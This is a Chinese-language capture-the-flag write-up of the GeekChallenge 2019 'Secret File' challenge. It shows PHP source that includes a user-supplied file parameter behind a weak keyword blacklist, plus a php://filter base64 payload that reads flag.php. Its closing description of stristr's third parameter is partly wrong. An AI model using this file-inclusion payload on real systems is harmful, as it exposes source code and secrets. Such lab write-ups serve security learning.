# include文件包含

## 实例

通过看页面源码可以看见一个Archive_room.php的文件，通过构造payload:
```
/Archive_room.php
```
看见一个页面，然后点击select，发现查阅结束

![极客大挑战 2019Secret File1](https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/极客大挑战 2019Secret File1.jpg)

然后再来一次，这次边点击边抓包，而后再将包发送一次发现一个php文件

![极客大挑战 2019Secret File2](https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/极客大挑战 2019Secret File2.jpg)

构造payload:
```
/secr3t.php
```
看见一串源码，并分析源码
```
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?>
```

通过分析，发现它过滤了../和tp和intput和data，且还看见了变量file和include文件包含，因此可以使用
include文件包含和伪协议，构造payload:

```
?file=php://filter/read=convert.base64-encode/resource=flag.php
```
![极客大挑战 2019Secret File3](https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/极客大挑战 2019Secret File3.jpg)

就可以得到一串base64编码的数值，然后进行解码即可得到flag


strstr(str1,str2)函数：判断str2是否是str1的子串，如果是则返回从str1字符串中str2第一次出现的位置开始到str1字符串的结尾，不是则返回null

stristr(str1,str2,ture/flase)函数：搜索str2在str1第一次出现的位置，如果是false，则返回第一次出现位置之后的字符串，ture则返回第一次出现位置之前的字符串，默认为flase，搜索不到则返回null